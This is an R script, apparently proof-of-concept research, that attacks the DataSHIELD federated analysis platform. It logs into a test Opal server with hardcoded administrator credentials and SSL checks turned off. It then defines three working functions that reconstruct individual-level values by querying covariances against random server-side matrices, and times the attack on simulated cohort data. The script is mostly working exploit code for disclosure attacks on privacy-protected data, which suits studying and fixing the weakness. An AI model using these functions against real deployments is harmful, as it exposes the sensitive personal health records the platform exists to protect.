rm(list=ls())
#------------------------Load packages------------------------------------------
#remotes::install_github("https://github.com/datashield/DSData.git")

library(DSI)
library(DSOpal)
library(dsBaseClient)

library(DSData)

#--------------------------log in----------------------------------------------
builder <- DSI::newDSLoginBuilder()

builder$append(server = "server1",  url = "https://192.168.56.100:8443",
               user = "administrator", password = "datashield_test&",
               driver = "OpalDriver", options='list(ssl_verifyhost=0, ssl_verifypeer=0)')

#2nd server can also be turned on
#builder$append(server = "server2", url = "https://192.168.56.101:8443",
#               user = "administrator", password = "datashield_test&",
#               driver = "OpalDriver",  options='list(ssl_verifyhost=0, ssl_verifypeer=0)')

logindata <- builder$build()

connections <- DSI::datashield.login(logins = logindata)

DSI::datashield.assign.table(conns = connections, symbol = "DST", table = c("CNSIM.CNSIM1","CNSIM.CNSIM2"))

#check that everything was created
ds.colnames("DST")
ds.dim("DST")



#------------------------Steel functions---------------------------------------
#--------------------------------------functions--------------------------------
create_random_vector_server_side <- function(n, newobj, mean, sd, datasources){
  Y <- c()
  random <- rpois(1, mean)#, sd) # POisson bsince otherwise digits are a problem
  Y[1] <- random
  ds.seq(FROM.value.char=paste(random), TO.value.char=paste(random),
         LENGTH.OUT.value.char=paste(1), newobj = newobj, datasources=datasources)
  for (i in 2:n){
    random <- rpois(1, mean)#, sd)
    ds.seq(FROM.value.char=paste(random), TO.value.char=paste(random),
           LENGTH.OUT.value.char=paste(1), newobj= paste0("s_", i), datasources=datasources)
    cat("\014")
    ds.cbind(c(newobj, paste0("s_", i)), newobj=newobj, datasources=datasources)
    cat("\014")
    Y <- cbind(Y, random)
  }
  return(Y)
}

create_random_nxn_matrix_server_side <- function(n, newobj, mean, sd, seed, datasources){
  set.seed(seed)
  Y <- create_random_vector_server_side(n, paste0(newobj), mean, sd, datasources=datasources)
  for (i in 2:n){
    Y <- rbind(Y, create_random_vector_server_side(n, paste0("col_", i), mean, sd, datasources=datasources))
    ds.rbind(c(newobj, paste0("col_", i)), newobj=newobj, datasources=datasources)
  }
  ds.dataFrame(newobj, newobj=newobj, datasources=datasources)
  return(Y)
}

compute_covariances <- function(x_col, y_cols, server, datasources){
  covs <- c()
  for (i in 1:length(y_cols)){
    covs[i] <- ds.cov(x_col, y_cols[i], type="split", datasources=datasources)[[1]]$`Variance-Covariance Matrix`[2,1]
  }
  return(covs)
}


#-------------------------Possible attack strategies----------------------------
#1. Attack possibility - using ds.seq, ds.rbind, ds.cbind -> slow
leak_x <- function(x, server, mean_Y, sd_Y, seed_Y, datasources){

  n <- ds.length(x, datasources=datasources)[[server]]
  Y <- create_random_nxn_matrix_server_side(n=n, newobj="Y", mean=mean_Y, sd=sd_Y, seed=seed_Y, datasources=datasources)
  covariances <- compute_covariances(x, c("Y$Y", paste0("Y$s_", 2:n) ), datasources=datasources)
  mean_x <- ds.mean(x, datasources=datasources)$Mean.by.Study[server, 1]

  return((n-1) * solve(t(Y)) %*% covariances + n* mean_x * solve(t(Y)) %*% colMeans(Y)) #need the transpose of Y since we solumns for covariances
}

#2. Attack possibility -using ds.rpois -> fast
leak_data_random <- function(x, sources){
  n <- ds.length(x, datasources=sources)[[1]]
  Y <- matrix(nrow=n, ncol=n)
  covariances  <- c()
  for (i in 1:n){
    ds.rNorm(samp.size=n,
             mean=0,
             sd=1,
             seed.as.integer = i,
             newobj=paste0("Y", i),
             datasources=sources)
  
    set.seed(i)
    Y[, i] <- rnorm(n, 0, 1)
    covariances[i] <- ds.cov(x=x, y=paste0("Y", i), datasources=sources)[[1]]$`Variance-Covariance Matrix`[2,1]
    cat("\014")
    print(i)
  }
  
  mean_x <- ds.mean(x, datasources=sources)[[1]][,1]

return((n-1) * solve(t(Y)) %*% covariances + n * mean_x * solve(t(Y)) %*% colMeans(Y))
}


#3. Attack possibility -using ds.dmtC2S -> fast
leak_data_random_outside_server <- function(x, sources){
  n <- ds.length(x, datasources=sources)[[1]]
  Y <- data.frame(matrix(rnorm(n^2), nrow=n, ncol=n))
  colnames(Y) <- paste0("Y_", 1:n)
  ds.dmtC2S(Y, newobj="Y", datasources = sources)
  covariances  <- c()
  for (i in 1:n){
    set.seed(i)
    covariances[i] <- ds.cov(x=x, y=paste0("Y$Y_", i), datasources=sources)[[1]]$`Variance-Covariance Matrix`[2,1]
    cat("\014")
    print(i)
  }
  
  mean_x <- ds.mean(x, datasources=sources)[[1]][,1]
return((n-1) * solve(t(Y)) %*% covariances + n * mean_x * solve(t(Y)) %*% colMeans(Y))
}


#-----------Sort data to compare results----(not needed for real world attack)--
#load original data
load("INSERT_PATH_HERE/datashield/DSData/data/CNSIM1.rda")
CNSIM1 <- na.omit(CNSIM1)
CBSIM_sorted <- CNSIM1[order(CNSIM1$LAB_TSC), ]

#sort, only needed to make results comparable
ds.completeCases(x1 = "DST",
                 newobj = "DST_complete", datasources = connections[1])
ds.dim("DST_complete", datasources=connections[1])

ds.dataFrameSort(df.name = "DST_complete",
                 sort.key.name = "DST_complete$LAB_TSC",
                 sort.descending = FALSE,
                 sort.method = "numeric",
                 newobj = "DST_sorted",
                 datasources = connections[1])

#-------------------------Run--------------------------------------------------
df_times <- c()
compare <- list()
iteration <- 1
for (sample_size in seq(10, 250, 20)){
  n <- ds.length("DST_sorted$PM_BMI_CONTINUOUS")$`length of DST_sorted$PM_BMI_CONTINUOUS in server1`
  ds.seq("1", "1", paste(n), newobj="S_int")
  ds.dataFrameSubset(df.name = "DST_sorted",
                     V1.name = "S_int",
                     V2.name = paste0(sample_size+1),
                     Boolean.operator = "<",
                     newobj = "subset.DST",
                     datasources = connections[1], #all servers are used
                     notify.of.progress = FALSE)

  #Leak
  start_time <- Sys.time()
  #based on ds.rpois
  leaked_x <- leak_data_random(x="subset.DST$PM_BMI_CONTINUOUS", sources=connections[1])
  end_time <- Sys.time()
  compare[[iteration]] <- cbind(leaked_x, CBSIM_sorted[1:sample_size , "PM_BMI_CONTINUOUS"])
  df_times <- rbind(df_times, c(sample_size, end_time - start_time, end_time, start_time))
  iteration <- 1 + iteration
  cat("\014")
}



